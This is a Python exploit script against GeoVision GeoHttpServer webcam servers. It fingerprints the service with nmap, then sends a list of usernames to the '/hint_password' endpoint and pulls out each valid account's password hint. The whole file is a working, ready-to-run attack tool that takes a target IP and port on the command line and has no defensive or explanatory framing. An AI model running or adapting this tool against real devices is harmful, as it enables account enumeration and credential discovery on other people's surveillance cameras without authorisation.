# Coded By : E | L F
from colorama import init , Fore
import nmap
import requests
import re
import argparse

init()

class Exploit():
    """ 
    This A Vulnerability For The Service GeoHttpServer
    
    """
    def __init__(self, ip: str, port: str, load_user_list = None) -> None:
        """_init_

        Args:
            ip (str): ip address target
            port (str): port service target
            load_user_list (_type_, optional): path list of usernames for cracking. Defaults to None.
        """
        
        self.ip : str = ip
        self.port : str = port
        if load_user_list is None:
            self.users : list = ['admin', 'root'] # defult user list
        else:
            self.users : list = self.load_user(load_user_list).split("\n") # all usernames to lines list 
        print(f"{Fore.CYAN}INFO {Fore.YELLOW}:{Fore.WHITE} loaded {Fore.MAGENTA}{len(self.users)}{Fore.WHITE} username for checker ")

    def checker(self) -> bool:
        """_checker_

        Returns:
            bool: checking service if exist return true
        """
        # call class portscanner for scanning 
        nm = nmap.PortScanner()
        nm.scan(self.ip, self.port, '-Pn -sV')
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                lport = nm[host][proto].keys()
                for port in lport:
                    service_name = nm[host][proto][port]['product'] # get the service version
                    if service_name == "GeoVision GeoHttpServer for webcams": 
                        return True
        return False
    
    def load_user(self, path_file: str) -> str:
        """_load_user_

        Args:
            path_file (str): path of username list for crack

        Returns:
            str: return all usernames
        """
        # read file usernames and return all datas
        with open(path_file, 'r') as file:
            data = file.read()
            return data

    def extract_hint(self, js_code:str ) -> str :
        """_extract_hint_

        Args:
            js_code (str): get the respones and find result 

        Returns:
            str: if can find hint return it
        """
        # regex code for find hint 
        pattern = r"var\s+hint\s*=\s*(['\"])(.*?)\1;"
        match = re.search(pattern, js_code)
        if match:
            return match.group(2) # respones request hint
        return None


    def return_hint(self) -> list: 
        """_return_hint_

        Returns:
            tuple: if can find hint return username and hint
        """
        goods = [] # all hints and usernames write here
        for user in self.users: 
            print(f"{Fore.CYAN}INFO {Fore.YELLOW}: {Fore.MAGENTA}tested user --> {Fore.WHITE}{user}")
            respones = requests.post(
                url="http://" + self.ip + ":" + self.port + "/hint_password",
                data={
                    "id": user,
                    "OK": "OK"
                }
            ) # sending request for checking username and get the hint
            result = self.extract_hint(respones.text) # result regex
            if result != "No such id":
                goods.append(
                    {
                        "username" : user,
                        "hint" : result
                    }
                )
        if goods:
           return goods
        return False 

if __name__ == "__main__":
    # get the parametr for checking
    parser = argparse.ArgumentParser(description='Vulnerability GeoVision GeoHttpServer')
    parser.add_argument('ip', help='IP address of the target')
    parser.add_argument('port', help='Port number of the target')
    parser.add_argument('-u', '--user-list', help='Path to the user list file' , default=None)
    args = parser.parse_args()
    ip_address = args.ip
    port = args.port
    user_list_file = args.user_list

    # call class Exploit and use for find hint
    app = Exploit(ip_address, port, user_list_file)
    print(f"{Fore.CYAN}INFO{Fore.YELLOW} :{Fore.WHITE} running scanner")

    # checking service version info
    result_check = app.checker()
    if result_check == True:    
        print(f"{Fore.GREEN}SUCSESS{Fore.YELLOW}: {Fore.WHITE} Vulnerability detected")
        print(f"{Fore.CYAN}INFO {Fore.YELLOW}: {Fore.WHITE} running username and hint finder")
        # send a list of usernames and find hint all of it
        result = app.return_hint()        
        if result != False:
            # print all goods
            for info in result:
                print(f"{Fore.GREEN} USERNAME{Fore.YELLOW} :{Fore.WHITE} {info['username']} \n {Fore.GREEN}HINT {Fore.YELLOW}:{Fore.WHITE} {info['hint']} ")
        else:
            print(f"{Fore.RED}ERROR{Fore.YELLOW} :{Fore.WHITE} not found hint")
    else:
        print(f"{Fore.RED}ERROR{Fore.YELLOW} :{Fore.WHITE} This vulnerability is not for this type of camera ")
